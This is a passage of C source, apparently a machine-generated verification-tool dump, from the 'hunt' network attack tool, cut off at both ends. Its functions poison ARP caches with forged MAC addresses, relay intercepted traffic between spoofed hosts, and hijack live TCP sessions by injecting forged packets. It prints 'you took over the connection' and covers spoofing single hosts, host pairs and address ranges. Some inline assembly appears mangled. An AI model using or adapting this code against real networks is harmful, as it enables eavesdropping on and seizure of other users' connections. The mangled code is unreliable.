        if(return_value_menu_choose_host_mask_ports_dfl_5 >= 0)
        {
          port_htons((unsigned int *)src_ports);
          port_htons((unsigned int *)dst_ports);
          list_lock(&l_add_policy);
          api->src_addr = src_ip;
          api->src_mask = src_mask;
          memcpy((void *)api->src_ports, (const void *)src_ports, sizeof(signed int) /*4ul*/  * (unsigned long int)(16 + 1));
          api->dst_addr = dst_ip;
          api->dst_mask = dst_mask;
          memcpy((void *)api->dst_ports, (const void *)dst_ports, sizeof(signed int) /*4ul*/  * (unsigned long int)(16 + 1));
          list_unlock(&l_add_policy);
        }

      }

    }

  }

}

// arp_dont_relay_insert
// file hunt.h line 543
struct arp_dont_relay * arp_dont_relay_insert(unsigned int src_addr, unsigned int dst_addr, unsigned int src_port, unsigned int dst_port)
{
  struct arp_dont_relay *adr;
  void *return_value_malloc_1;
  return_value_malloc_1=malloc(sizeof(struct arp_dont_relay) /*24ul*/ );
  adr = (struct arp_dont_relay *)return_value_malloc_1;
  /* assertion adr */
  assert(adr != ((struct arp_dont_relay *)NULL));
  adr->src_addr = src_addr;
  adr->dst_addr = dst_addr;
  adr->src_port = (unsigned short int)src_port;
  adr->dst_port = (unsigned short int)dst_port;
  list_push(&l_arp_dont_relay, (void *)adr);
  return adr;
}

// arp_dont_relay_remove
// file hunt.h line 546
void arp_dont_relay_remove(struct arp_dont_relay *adr)
{
  list_remove(&l_arp_dont_relay, (void *)adr);
  free((void *)adr);
}

// arp_hijack
// file arphijack.c line 103
signed int arp_hijack(struct conn_info *ci, char *src_fake_mac, char *dst_fake_mac, signed int input_mode)
{
  struct iphdr *iph;
  struct tcphdr *tcph;
  struct tcp_spec ts;
  struct ifunc_item ifunc_dst;
  struct ifunc_item ifunc_src;
  struct packet *p;
  signed int count_dst = 0;
  signed int count_src = 0;
  unsigned long int thr_tty;
  struct watch_tty_data wtd;
  asi_dst = (struct arp_spoof_info *)(void *)0;
  asi_src = asi_dst;
  dont_relay=arp_dont_relay_insert((unsigned int)ci->src_addr, (unsigned int)ci->dst_addr, (unsigned int)ci->src_port, (unsigned int)ci->dst_port);
  if(!(src_fake_mac == ((char *)NULL)))
  {
    asi_src=start_arp_spoof((unsigned int)ci->src_addr, (unsigned int)ci->dst_addr, (char *)(void *)0, (char *)(void *)0, (char *)(void *)0, 0, 0, 0);
    if(asi_src == ((struct arp_spoof_info *)NULL))
      asi_src=start_arp_spoof((unsigned int)ci->src_addr, (unsigned int)ci->dst_addr, (char *)ci->src.src_mac, (char *)ci->dst.src_mac, src_fake_mac, 0, 0, 0);

  }

  else
    asi_src=get_arp_spoof((unsigned int)ci->src_addr, (unsigned int)ci->dst_addr);
  signed int return_value_user_arpspoof_test_4;
  if(!(asi_src == ((struct arp_spoof_info *)NULL)))
  {
    return_value_user_arpspoof_test_4=user_arpspoof_test(asi_src);
    if(!(return_value_user_arpspoof_test_4 == 0))
    {
      signed int return_value_user_run_arpspoof_until_successed_3;
      return_value_user_run_arpspoof_until_successed_3=user_run_arpspoof_until_successed(asi_src);
      if(!(return_value_user_run_arpspoof_until_successed_3 == 0))
      {
        set_tty_color((enum TTY_COLOR)COLOR_BRIGHTRED);
        char *return_value_host_lookup_1;
        return_value_host_lookup_1=host_lookup(asi_src->src_addr, hl_mode);
        char *return_value_host_lookup_2;
        return_value_host_lookup_2=host_lookup(asi_src->dst_addr, hl_mode);
        printf("ARP spoof of %s in host %s FAILED\n", return_value_host_lookup_1, return_value_host_lookup_2);
        set_tty_color((enum TTY_COLOR)COLOR_LIGHTGRAY);
        fflush(stdout);
        if(!(src_fake_mac == ((char *)NULL)))
          stop_arp_spoof(asi_src);

        asi_src = (struct arp_spoof_info *)(void *)0;
      }

    }

  }

  if(!(dst_fake_mac == ((char *)NULL)))
  {
    asi_dst=start_arp_spoof((unsigned int)ci->dst_addr, (unsigned int)ci->src_addr, (char *)(void *)0, (char *)(void *)0, (char *)(void *)0, 0, 0, 0);
    if(asi_dst == ((struct arp_spoof_info *)NULL))
      asi_dst=start_arp_spoof((unsigned int)ci->dst_addr, (unsigned int)ci->src_addr, (char *)ci->dst.src_mac, (char *)ci->src.src_mac, dst_fake_mac, 0, 0, 0);

  }

  else
    asi_dst=get_arp_spoof((unsigned int)ci->dst_addr, (unsigned int)ci->src_addr);
  signed int return_value_user_arpspoof_test_8;
  if(!(asi_dst == ((struct arp_spoof_info *)NULL)))
  {
    return_value_user_arpspoof_test_8=user_arpspoof_test(asi_dst);
    if(!(return_value_user_arpspoof_test_8 == 0))
    {
      signed int return_value_user_run_arpspoof_until_successed_7;
      return_value_user_run_arpspoof_until_successed_7=user_run_arpspoof_until_successed(asi_dst);
      if(!(return_value_user_run_arpspoof_until_successed_7 == 0))
      {
        set_tty_color((enum TTY_COLOR)COLOR_BRIGHTRED);
        char *return_value_host_lookup_5;
        return_value_host_lookup_5=host_lookup(asi_dst->src_addr, hl_mode);
        char *return_value_host_lookup_6;
        return_value_host_lookup_6=host_lookup(asi_dst->dst_addr, hl_mode);
        printf("ARP spoof of %s in host %s FAILED\n", return_value_host_lookup_5, return_value_host_lookup_6);
        set_tty_color((enum TTY_COLOR)COLOR_LIGHTGRAY);
        fflush(stdout);
        if(!(dst_fake_mac == ((char *)NULL)))
          stop_arp_spoof(asi_dst);

        asi_dst = (struct arp_spoof_info *)(void *)0;
      }

    }

  }

  set_tty_color((enum TTY_COLOR)COLOR_WHITE);
  printf("you took over the connection\n");
  set_tty_color((enum TTY_COLOR)COLOR_BRIGHTRED);
  printf("CTRL-] to break\n");
  set_tty_color((enum TTY_COLOR)COLOR_LIGHTGRAY);
  fflush(stdout);
  unsigned char *tmp_if_expr_9;
  if(!(asi_src == ((struct arp_spoof_info *)NULL)))
    tmp_if_expr_9 = asi_src->src_fake_mac;

  else
    tmp_if_expr_9 = ci->src.src_mac;
  wtd.src_fake_mac = (char *)tmp_if_expr_9;
  wtd.ci = ci;
  wtd.input_mode = input_mode;
  list_produce_start(&l_hijack_conn);
  pthread_create(&thr_tty, (const union pthread_attr_t *)(void *)0, (void * (*)(void *))watch_tty, (void *)&wtd);
  ifunc_dst.func = (void (*)(struct packet *, void *))func_hijack_dst;
  ifunc_dst.arg = (void *)ci;
  list_enqueue(&l_ifunc_tcp, (void *)&ifunc_dst);
  ifunc_src.func = (void (*)(struct packet *, void *))func_hijack_src;
  ifunc_src.arg = (void *)ci;
  list_enqueue(&l_ifunc_tcp, (void *)&ifunc_src);
  void *return_value_list_consume_10;
  _Bool tmp_if_expr_22;
  _Bool tmp_if_expr_23;
  _Bool tmp_if_expr_24;
  unsigned char *tmp_if_expr_11;
  signed int tmp_if_expr_13;
  unsigned short int tmp_statement_expression_12;
  unsigned short int tmp_statement_expression_14;
  unsigned short int tmp_statement_expression_15;
  unsigned char *tmp_if_expr_16;
  signed int tmp_if_expr_18;
  unsigned short int tmp_statement_expression_17;
  unsigned short int tmp_statement_expression_19;
  unsigned short int tmp_statement_expression_20;
  _Bool tmp_if_expr_21;
  do
  {
    return_value_list_consume_10=list_consume(&l_hijack_conn, (struct timespec *)(void *)0);
    p = (struct packet *)return_value_list_consume_10;
    if(p == ((struct packet *)NULL))
      break;

    iph = p->p_iph;
    tcph = p->p_hdr.p_tcph;
    if((unsigned long int)iph->saddr == ci->dst_addr)
      tmp_if_expr_22 = (unsigned long int)iph->daddr == ci->src_addr ? (_Bool)1 : (_Bool)0;

    else
      tmp_if_expr_22 = (_Bool)0;
    if(tmp_if_expr_22)
      tmp_if_expr_23 = tcph->_anon0._anon1.source == ci->dst_port ? (_Bool)1 : (_Bool)0;

    else
      tmp_if_expr_23 = (_Bool)0;
    if(tmp_if_expr_23)
      tmp_if_expr_24 = tcph->_anon0._anon1.dest == ci->src_port ? (_Bool)1 : (_Bool)0;

    else
      tmp_if_expr_24 = (_Bool)0;
    if(tmp_if_expr_24)
    {
      if(!(p->p_data_len == 0))
      {
        count_dst = count_dst + 1;
        print_data_packet(p, p->p_data_len, count_dst, 1);
        packet_free(p);
        memset((void *)&ts, 0, sizeof(struct tcp_spec) /*88ul*/ );
        ts.saddr = ci->src_addr;
        ts.daddr = ci->dst_addr;
        ts.sport = ci->src_port;
        ts.dport = ci->dst_port;
        if(!(asi_src == ((struct arp_spoof_info *)NULL)))
          tmp_if_expr_11 = asi_src->src_fake_mac;

        else
          tmp_if_expr_11 = ci->src.src_mac;
        ts.src_mac = (char *)tmp_if_expr_11;
        ts.dst_mac = (char *)ci->dst.src_mac;
        ts.seq = ci->dst.next_d_seq;
        ts.ack_seq = ci->dst.next_seq;
        if(!(ci->src.window == 0))
          tmp_if_expr_13 = (signed int)ci->src.window;

        else
        {
          unsigned short int __v;
          unsigned short int __x = (unsigned short int)242;
          asm("rorw _8, %w0" : "=r"(__v) : "0"(__x) : "cc");
          tmp_statement_expression_12 = __v;
          tmp_if_expr_13 = (signed int)tmp_statement_expression_12;
        }
        ts.window = (unsigned short int)tmp_if_expr_13;
        unsigned short int arp_hijack__1__5__1__1__2____v;
        unsigned short int arp_hijack__1__5__1__1__2____x;
        unsigned short int arp_hijack__1__5__1__1__2__1____v;
        unsigned short int arp_hijack__1__5__1__1__2__1____x = (unsigned short int)ci->src.id;
        asm("rorw _8, %w0" : "=r"(arp_hijack__1__5__1__1__2__1____v) : "0"(arp_hijack__1__5__1__1__2__1____x) : "cc");
        tmp_statement_expression_15 = arp_hijack__1__5__1__1__2__1____v;
        arp_hijack__1__5__1__1__2____x = (unsigned short int)((signed int)tmp_statement_expression_15 + 1);
        asm("rorw _8, %w0" : "=r"(arp_hijack__1__5__1__1__2____v) : "0"(arp_hijack__1__5__1__1__2____x) : "cc");
        tmp_statement_expression_14 = arp_hijack__1__5__1__1__2____v;
        ts.id = tmp_statement_expression_14;
        ts.ack = 1;
        ts.psh = 1;
        ts.rst = 0;
        ts.data = (char *)(void *)0;
        ts.data_len = 0;
        send_tcp_packet(&ts);
      }

      else
        packet_free(p);
    }

    else
    {
      if(!(p->p_data_len == 0))
      {
        count_src = count_src + 1;
        print_data_packet(p, p->p_data_len, count_src, 0);
        memset((void *)&ts, 0, sizeof(struct tcp_spec) /*88ul*/ );
        ts.saddr = ci->dst_addr;
        ts.daddr = ci->src_addr;
        ts.sport = ci->dst_port;
        ts.dport = ci->src_port;
        if(!(asi_dst == ((struct arp_spoof_info *)NULL)))
          tmp_if_expr_16 = asi_dst->src_fake_mac;

        else
          tmp_if_expr_16 = ci->dst.src_mac;
        ts.src_mac = (char *)tmp_if_expr_16;
        ts.dst_mac = (char *)ci->src.src_mac;
        ts.seq = ci->src.next_d_seq;
        ts.ack_seq = ci->src.next_seq;
        if(!(ci->dst.window == 0))
          tmp_if_expr_18 = (signed int)ci->dst.window;

        else
        {
          unsigned short int arp_hijack__1__5__2__1__1____v;
          unsigned short int arp_hijack__1__5__2__1__1____x = (unsigned short int)242;
          asm("rorw _8, %w0" : "=r"(arp_hijack__1__5__2__1__1____v) : "0"(arp_hijack__1__5__2__1__1____x) : "cc");
          tmp_statement_expression_17 = arp_hijack__1__5__2__1__1____v;
          tmp_if_expr_18 = (signed int)tmp_statement_expression_17;
        }
        ts.window = (unsigned short int)tmp_if_expr_18;
        unsigned short int arp_hijack__1__5__2__1__2____v;
        unsigned short int arp_hijack__1__5__2__1__2____x;
        unsigned short int arp_hijack__1__5__2__1__2__1____v;
        unsigned short int arp_hijack__1__5__2__1__2__1____x = (unsigned short int)ci->dst.id;
        asm("rorw _8, %w0" : "=r"(arp_hijack__1__5__2__1__2__1____v) : "0"(arp_hijack__1__5__2__1__2__1____x) : "cc");
        tmp_statement_expression_20 = arp_hijack__1__5__2__1__2__1____v;
        arp_hijack__1__5__2__1__2____x = (unsigned short int)((signed int)tmp_statement_expression_20 + 1);
        asm("rorw _8, %w0" : "=r"(arp_hijack__1__5__2__1__2____v) : "0"(arp_hijack__1__5__2__1__2____x) : "cc");
        tmp_statement_expression_19 = arp_hijack__1__5__2__1__2____v;
        ts.id = tmp_statement_expression_19;
        ts.ack = 1;
        ts.psh = 1;
        ts.rst = 0;
        if((signed int)*p->p_data == 13)
          tmp_if_expr_21 = (_Bool)1;

        else
          tmp_if_expr_21 = (signed int)p->p_data[(signed long int)0] == 10 ? (_Bool)1 : (_Bool)0;
        if(tmp_if_expr_21)
        {
          ts.data = "\r\n_ ";
          ts.data_len = 4;
        }

        else
        {
          ts.data = p->p_data;
          ts.data_len = p->p_data_len;
        }
        send_tcp_packet(&ts);
      }

      packet_free(p);
    }
  }
  while((_Bool)1);
  list_remove(&l_ifunc_tcp, (void *)&ifunc_dst);
  list_remove(&l_ifunc_tcp, (void *)&ifunc_src);
  packet_flush(&l_hijack_conn);
  pthread_join(thr_tty, (void **)(void *)0);
  return 0;
}

// arp_hijack_done
// file arphijack.c line 261
void arp_hijack_done(char *src_fake_mac, char *dst_fake_mac)
{
  arp_dont_relay_remove(dont_relay);
  if(!(src_fake_mac == ((char *)NULL)) && !(asi_src == ((struct arp_spoof_info *)NULL)))
    stop_arp_spoof(asi_src);

  asi_src = (struct arp_spoof_info *)(void *)0;
  if(!(dst_fake_mac == ((char *)NULL)) && !(asi_dst == ((struct arp_spoof_info *)NULL)))
    stop_arp_spoof(asi_dst);

  asi_dst = (struct arp_spoof_info *)(void *)0;
}

// arp_relay
// file arpspoof.c line 728
static void * arp_relay(void *arg)
{
  struct packet *p;
  struct packet *p_new;
  struct arp_spoof_info *asi;
  struct arp_spoof_info *arp_relay__1__asi_dst;
  struct list_iterator li;
  struct iphdr *iph;
  struct mac_info *mi_src;
  signed int found = 0;
  pthread_sigmask(0, &intr_mask, (struct anonymous_3 *)(void *)0);
  signed int return_value_getpid_1;
  return_value_getpid_1=getpid();
  setpriority(0, (unsigned int)return_value_getpid_1, 10);
  void *return_value_list_consume_2;
  void *return_value_list_iter_get_5;
  do
  {
    return_value_list_consume_2=list_consume(&l_relay_pkt, (struct timespec *)(void *)0);
    p = (struct packet *)return_value_list_consume_2;
    if(p == ((struct packet *)NULL))
      break;

    asi = (struct arp_spoof_info *)p->p_arg[(signed long int)3];
    if(asi->src_mac_valid == 0)
    {
      mi_src=mac_info_get(asi->src_addr);
      if(!(mi_src == ((struct mac_info *)NULL)))
      {
        memcpy((void *)asi->src_mac, (const void *)mi_src->mac, (unsigned long int)6);
        asi->src_mac_valid = 1;
        mac_info_release(mi_src);
      }

      else
        mac_discover(asi->src_addr, 1);
      asi_release(asi);
      packet_free(p);
    }

    else
    {
      if(asi->dst_mac_valid == 0)
      {
        memcpy((void *)asi->dst_mac, (const void *)p->p_ethh->h_source, (unsigned long int)6);
        asi->dst_mac_valid = 1;
      }

      signed int return_value_check_dont_relay_3;
      return_value_check_dont_relay_3=check_dont_relay(p);
      if(!(return_value_check_dont_relay_3 == 0))
      {
        print_relay_packet("arp_realyer drop", p, 0);
        asi_release(asi);
        packet_free(p);
      }

      else
      {
        signed int return_value_process_pktrelay_4;
        return_value_process_pktrelay_4=process_pktrelay(p, asi);
        if(!(return_value_process_pktrelay_4 == 0))
        {
          print_relay_packet("arp_relayer pktrelay", p, 0);
          asi_release(asi);
          packet_free(p);
        }

        else
        {
          p_new=packet_new();
          packet_copy_data(p_new, p);
          packet_free(p);
          p = p_new;
          iph = p->p_iph;
          memcpy((void *)p->p_ethh->h_dest, (const void *)asi->src_mac, (unsigned long int)6);
          asi_release(asi);
          found = 0;
          list_iter_set(&li, &l_arp_spoof);
          do
          {
            return_value_list_iter_get_5=list_iter_get(&li);
            arp_relay__1__asi_dst = (struct arp_spoof_info *)return_value_list_iter_get_5;
            if(arp_relay__1__asi_dst == ((struct arp_spoof_info *)NULL))
              break;

            if(iph->saddr == arp_relay__1__asi_dst->src_addr)
            {
              if(iph->daddr == arp_relay__1__asi_dst->dst_addr)
              {
                memcpy((void *)p->p_ethh->h_source, (const void *)arp_relay__1__asi_dst->src_fake_mac, (unsigned long int)6);
                found = 1;
                break;
              }

            }

          }
          while((_Bool)1);
          list_iter_end(&li);
          if(found == 0 && !(arp_spoof_switch == 0))
            memcpy((void *)p->p_ethh->h_source, (const void *)my_eth_mac, (unsigned long int)6);

          print_relay_packet("arp_relayer got", p, 1);
          relay_modify_hook(p_new);
          send_packet(p_new);
          packet_free(p_new);
        }
      }
    }
  }
  while((_Bool)1);
  return (void *)0;
}

// arp_request_spoof_through_request_setup
// file options.c line 117
static void arp_request_spoof_through_request_setup(void)
{
  signed int return_value_menu_choose_char_1;
  return_value_menu_choose_char_1=menu_choose_char("arp request spoof through request", "yn", (char)(arp_request_spoof_through_request != 0 ? 121 : 110));
  switch(return_value_menu_choose_char_1)
  {
    case 121:
    {
      arp_request_spoof_through_request = 1;
      break;
    }
    case 110:
      arp_request_spoof_through_request = 0;
  }
}

// arp_rr_count_setup
// file options.c line 108
static void arp_rr_count_setup(void)
{
  signed int n;
  n=menu_choose_unr("Number of ARP request/reply packets hunt will send", 1, 32, arp_rr_count);
  if(n >= 0)
    arp_rr_count = n;

}

// arp_spoof_add_h
// file arpspoof.c line 1109
static void arp_spoof_add_h(void)
{
  unsigned int src_ip;
  unsigned int dst_ip;
  struct arp_spoof_info *asi_src_in_dst;
  struct arp_spoof_info *asi_dst_in_src;
  unsigned char src_fake_mac[6l] = { (unsigned char)0x00, (unsigned char)0x60, (unsigned char)0x08, (unsigned char)0xBE, (unsigned char)0x91, (unsigned char)0xEF };
  unsigned char dst_fake_mac[6l] = { (unsigned char)0x00, (unsigned char)0x60, (unsigned char)0x08, (unsigned char)0xBE, (unsigned char)0x91, (unsigned char)0xEE };
  char buf[512l];
  struct mac_info *mi_src;
  struct mac_info *mi_dst;
  signed int refresh;
  signed int src_can_forward;
  signed int dst_can_forward;
  src_ip=menu_choose_hostname("src/dst host1 to arp spoof", (char *)(void *)0);
  if(!(src_ip == 4294967295u))
  {
    unsigned char *return_value_suggest_mac_1;
    return_value_suggest_mac_1=suggest_mac();
    sprintf_eth_mac(buf, return_value_suggest_mac_1);
    signed int return_value_menu_choose_mac_2;
    return_value_menu_choose_mac_2=menu_choose_mac("host1 fake mac", src_fake_mac, buf);
    if(return_value_menu_choose_mac_2 >= 0)
    {
      if(!(can_forward_question == 0))
      {
        src_can_forward=menu_choose_yn("is host IP router y/n", 0);
        if(!(src_can_forward >= 0))
          goto __CPROVER_DUMP_L16;

      }

      else
        src_can_forward = 1;
      dst_ip=menu_choose_hostname("src/dst host2 to arp spoof", (char *)(void *)0);
      if(!(dst_ip == 4294967295u))
      {
        unsigned char *return_value_suggest_mac_3;
        return_value_suggest_mac_3=suggest_mac();
        sprintf_eth_mac(buf, return_value_suggest_mac_3);
        signed int return_value_menu_choose_mac_4;
        return_value_menu_choose_mac_4=menu_choose_mac("host2 fake mac", dst_fake_mac, buf);
        if(return_value_menu_choose_mac_4 >= 0)
        {
          if(!(can_forward_question == 0))
          {
            dst_can_forward=menu_choose_yn("is host IP router y/n", 0);
            if(!(dst_can_forward >= 0))
              goto __CPROVER_DUMP_L16;

          }

          else
            dst_can_forward = 1;
          refresh=menu_choose_unr("refresh interval sec", 0, 100000, 0);
          if(refresh >= 0)
          {
            mi_src=mac_info_get(src_ip);
            if(mi_src == ((struct mac_info *)NULL))
            {
              mac_discover(src_ip, 2);
              sec_nanosleep(1);
              mi_src=mac_info_get(src_ip);
              if(!(mi_src == ((struct mac_info *)NULL)))
                goto __CPROVER_DUMP_L12;

              printf("ERR: host1 mac isn't known\n");
            }

            else
            {

            __CPROVER_DUMP_L12:
              ;
              mi_dst=mac_info_get(dst_ip);
              if(mi_dst == ((struct mac_info *)NULL))
              {
                mac_discover(dst_ip, 2);
                sec_nanosleep(1);
                mi_dst=mac_info_get(dst_ip);
                if(!(mi_dst == ((struct mac_info *)NULL)))
                  goto __CPROVER_DUMP_L13;

                mac_info_release(mi_src);
                printf("ERR: host2 mac isn't known\n");
              }

              else
              {

              __CPROVER_DUMP_L13:
                ;
                asi_src_in_dst=start_arp_spoof(src_ip, dst_ip, mi_src->mac, mi_dst->mac, (char *)src_fake_mac, refresh, src_can_forward, 0);
                asi_dst_in_src=start_arp_spoof(dst_ip, src_ip, mi_dst->mac, mi_src->mac, (char *)dst_fake_mac, refresh, dst_can_forward, 0);
                mac_info_release(mi_src);
                mac_info_release(mi_dst);
                signed int return_value_user_arpspoof_test_5;
                return_value_user_arpspoof_test_5=user_arpspoof_test(asi_src_in_dst);
                if(!(return_value_user_arpspoof_test_5 == 0))
                  user_run_arpspoof_until_successed(asi_src_in_dst);

                signed int return_value_user_arpspoof_test_6;
                return_value_user_arpspoof_test_6=user_arpspoof_test(asi_dst_in_src);
                if(!(return_value_user_arpspoof_test_6 == 0))
                  user_run_arpspoof_until_successed(asi_dst_in_src);

              }
            }
          }

        }

      }

    }

  }


__CPROVER_DUMP_L16:
  ;
}

// arp_spoof_add_item
// file arpspoof.c line 964
static void arp_spoof_add_item(void)
{
  unsigned int src_ip;
  unsigned int dst_ip;
  unsigned char src_fake_mac[6l];
  struct mac_info *mi_src;
  struct mac_info *mi_dst;
  struct arp_spoof_info *asi_src_in_dst;
  char buf[512l];
  signed int refresh;
  signed int can_forward;
  src_ip=menu_choose_hostname("host to spoof", (char *)(void *)0);
  char *tmp_if_expr_5;
  char *tmp_if_expr_6;
  if(!(src_ip == 4294967295u))
  {
    unsigned char *return_value_suggest_mac_1;
    return_value_suggest_mac_1=suggest_mac();
    sprintf_eth_mac(buf, return_value_suggest_mac_1);
    signed int return_value_menu_choose_mac_2;
    return_value_menu_choose_mac_2=menu_choose_mac("fake mac", src_fake_mac, buf);
    if(return_value_menu_choose_mac_2 >= 0)
    {
      if(!(can_forward_question == 0))
      {
        can_forward=menu_choose_yn("is host IP router y/n", 0);
        if(!(can_forward >= 0))
          goto __CPROVER_DUMP_L20;

      }

      else
        can_forward = 1;
      dst_ip=menu_choose_hostname("target - where to insert the spoof", (char *)(void *)0);
      if(!(dst_ip == 4294967295u))
      {
        refresh=menu_choose_unr("refresh interval sec", 0, 100000, 0);
        if(refresh >= 0)
        {
          mi_src=mac_info_get(src_ip);
          if(mi_src == ((struct mac_info *)NULL))
          {
            mac_discover(src_ip, 2);
            sec_nanosleep(1);
            mi_src=mac_info_get(src_ip);
            if(mi_src == ((struct mac_info *)NULL))
            {
              signed int return_value_menu_choose_yn_3;
              return_value_menu_choose_yn_3=menu_choose_yn("src mac isn't known - continue? y/n", 0);
              if(!(return_value_menu_choose_yn_3 >= 1))
                goto __CPROVER_DUMP_L20;

            }

          }

          mi_dst=mac_info_get(dst_ip);
          if(mi_dst == ((struct mac_info *)NULL))
          {
            mac_discover(dst_ip, 2);
            sec_nanosleep(1);
            mi_dst=mac_info_get(dst_ip);
            if(mi_dst == ((struct mac_info *)NULL))
            {
              signed int return_value_menu_choose_yn_4;
              return_value_menu_choose_yn_4=menu_choose_yn("dst mac isn't known - continue? y/n", 0);
              if(!(return_value_menu_choose_yn_4 >= 1))
              {
                if(!(mi_src == ((struct mac_info *)NULL)))
                  mac_info_release(mi_src);

                goto __CPROVER_DUMP_L20;
              }

            }

          }

          if(!(mi_src == ((struct mac_info *)NULL)))
            tmp_if_expr_5 = mi_src->mac;

          else
            tmp_if_expr_5 = (char *)(void *)0;
          if(!(mi_dst == ((struct mac_info *)NULL)))
            tmp_if_expr_6 = mi_dst->mac;

          else
            tmp_if_expr_6 = (char *)(void *)0;
          asi_src_in_dst=start_arp_spoof(src_ip, dst_ip, tmp_if_expr_5, tmp_if_expr_6, (char *)src_fake_mac, refresh, can_forward, 0);
          if(!(mi_src == ((struct mac_info *)NULL)))
            mac_info_release(mi_src);

          if(!(mi_dst == ((struct mac_info *)NULL)))
          {
            mac_info_release(mi_dst);
            signed int return_value_user_arpspoof_test_7;
            return_value_user_arpspoof_test_7=user_arpspoof_test(asi_src_in_dst);
            if(!(return_value_user_arpspoof_test_7 == 0))
              user_run_arpspoof_until_successed(asi_src_in_dst);

          }

        }

      }

    }

  }


__CPROVER_DUMP_L20:
  ;
}

// arp_spoof_count
// file arpspoof.c line 1062
static signed int arp_spoof_count(void)
{
  struct list_iterator li;
  struct arp_spoof_info *asi;
  signed int count = 0;
  list_iter_set(&li, &l_arp_spoof);
  void *return_value_list_iter_get_1;
  do
  {
    return_value_list_iter_get_1=list_iter_get(&li);
    asi = (struct arp_spoof_info *)return_value_list_iter_get_1;
    if(asi == ((struct arp_spoof_info *)NULL))
      break;

    if(!(asi->in_range == 0))
      break;

    count = count + 1;
  }
  while((_Bool)1);
  list_iter_end(&li);
  return count;
}

// arp_spoof_del_h
// file arpspoof.c line 1175
static void arp_spoof_del_h(void)
{
  struct arp_spoof_info *asi;
  unsigned int ip1;
  unsigned int ip2;
  struct list_iterator li;
  signed int i;
  arp_spoof_list_items();
  signed int return_value_arp_spoof_count_1;
  return_value_arp_spoof_count_1=arp_spoof_count();
  i=menu_choose_unr("item nr. with src/dst or [cr]", 0, return_value_arp_spoof_count_1 - 1, -1);
  if(!(i >= 0))
  {
    ip1=menu_choose_hostname("src/dst host1 to remove", (char *)(void *)0);
    if(ip1 == 4294967295u)
      goto __CPROVER_DUMP_L9;

    ip2=menu_choose_hostname("src/dst host2 to remove", (char *)(void *)0);
    if(ip2 == 4294967295u)
      goto __CPROVER_DUMP_L9;

  }

  else
  {
    void *return_value_list_at_2;
    return_value_list_at_2=list_at(&l_arp_spoof, i);
    asi = (struct arp_spoof_info *)return_value_list_at_2;
    ip1 = asi->src_addr;
    ip2 = asi->dst_addr;
  }
  list_iter_set(&li, &l_arp_spoof);
  void *return_value_list_iter_get_3;
  do
  {
    return_value_list_iter_get_3=list_iter_get(&li);
    asi = (struct arp_spoof_info *)return_value_list_iter_get_3;
    if(asi == ((struct arp_spoof_info *)NULL))
      break;

    if(asi->src_addr == ip1)
    {
      if(asi->dst_addr == ip2)
        stop_arp_spoof(asi);

    }

    if(asi->dst_addr == ip1)
    {
      if(asi->src_addr == ip2)
        stop_arp_spoof(asi);

    }

  }
  while((_Bool)1);
  list_iter_end(&li);

__CPROVER_DUMP_L9:
  ;
}

// arp_spoof_del_item
// file arpspoof.c line 1079
static void arp_spoof_del_item(void)
{
  signed int i;
  struct arp_spoof_info *asi;
  arp_spoof_list_items();
  signed int return_value_arp_spoof_count_1;
  return_value_arp_spoof_count_1=arp_spoof_count();
  i=menu_choose_unr("item nr. to delete", 0, return_value_arp_spoof_count_1 - 1, -1);
  if(i >= 0)
  {
    void *return_value_list_at_2;
    return_value_list_at_2=list_at(&l_arp_spoof, i);
    asi = (struct arp_spoof_info *)return_value_list_at_2;
    stop_arp_spoof(asi);
  }

}

// arp_spoof_list_items
// file arpspoof.c line 919
static signed int arp_spoof_list_items(void)
{
  struct list_iterator li;
  struct arp_spoof_info *asi;
  char buf[512l];
  signed int i = 0;
  list_iter_set(&li, &l_arp_spoof);
  void *return_value_list_iter_get_1;
  signed int tmp_post_2;
  do
  {
    return_value_list_iter_get_1=list_iter_get(&li);
    asi = (struct arp_spoof_info *)return_value_list_iter_get_1;
    if(asi == ((struct arp_spoof_info *)NULL))
      break;

    if(!(asi->in_range == 0))
      break;

    sprintf_eth_mac(buf, asi->src_fake_mac);
    tmp_post_2 = i;
    i = i + 1;
    char *return_value_host_lookup_3;
    return_value_host_lookup_3=host_lookup(asi->dst_addr, hl_mode);
    char *return_value_host_lookup_4;
    return_value_host_lookup_4=host_lookup(asi->src_addr, hl_mode);
    printf("%2d) on %-16s is %-16s as %s refresh %ds\n", tmp_post_2, return_value_host_lookup_3, return_value_host_lookup_4, (const void *)buf, asi->refresh);
    if(i % lines_o == 0)
      lines_o_press_key();

  }
  while((_Bool)1);
  list_iter_end(&li);
  return i;
}

// arp_spoof_range_add
// file arpspoof.c line 1019
static void arp_spoof_range_add(void)
{
  unsigned int src_ip;
  unsigned int dst_start_ip;
  unsigned int dst_end_ip;
  unsigned char src_fake_mac[6l];
  struct arp_spoof_range *asr;
  char buf[512l];
  signed int refresh;
  signed int can_forward;
  src_ip=menu_choose_hostname("host to spoof", (char *)(void *)0);
  if(!(src_ip == 4294967295u))
  {
    unsigned char *return_value_suggest_mac_1;
    return_value_suggest_mac_1=suggest_mac();
    sprintf_eth_mac(buf, return_value_suggest_mac_1);
    signed int return_value_menu_choose_mac_2;
    return_value_menu_choose_mac_2=menu_choose_mac("fake mac", src_fake_mac, buf);
    if(return_value_menu_choose_mac_2 >= 0)
    {
      if(!(can_forward_question == 0))
      {
        can_forward=menu_choose_yn("is host IP router y/n", 0);
        if(!(can_forward >= 0))
          goto __CPROVER_DUMP_L10;

      }

      else
        can_forward = 1;
      dst_start_ip=menu_choose_hostname("start target where to insert the spoof", (char *)(void *)0);
      if(!(dst_start_ip == 4294967295u))
      {
        dst_end_ip=menu_choose_hostname("end target where to insert the spoof", (char *)(void *)0);
        if(!(dst_end_ip == 4294967295u))
        {
          refresh=menu_choose_unr("refresh interval sec", 0, 100000, 0);
          if(refresh >= 0)
          {
            void *return_value_malloc_3;
            return_value_malloc_3=malloc(sizeof(struct arp_spoof_range) /*48ul*/ );
            asr = (struct arp_spoof_range *)return_value_malloc_3;
            /* assertion asr */
            assert(asr != ((struct arp_spoof_range *)NULL));
            memset((void *)asr, 0, sizeof(struct arp_spoof_range) /*48ul*/ );
            asr->asi = (struct arp_spoof_info **)(void *)0;
            asr->asi_count = 0;
            asr->dst_start_addr = dst_start_ip;
            asr->dst_end_addr = dst_end_ip;
            asr->src_addr = src_ip;
            memcpy((void *)asr->src_fake_mac, (const void *)src_fake_mac, (unsigned long int)6);
            asr->refresh = refresh;
            asr->can_forward = can_forward;
            signed int return_value_start_arp_spoof_range_4;
            return_value_start_arp_spoof_range_4=start_arp_spoof_range(asr);
            if(!(return_value_start_arp_spoof_range_4 >= 0))
              free((void *)asr);

            else
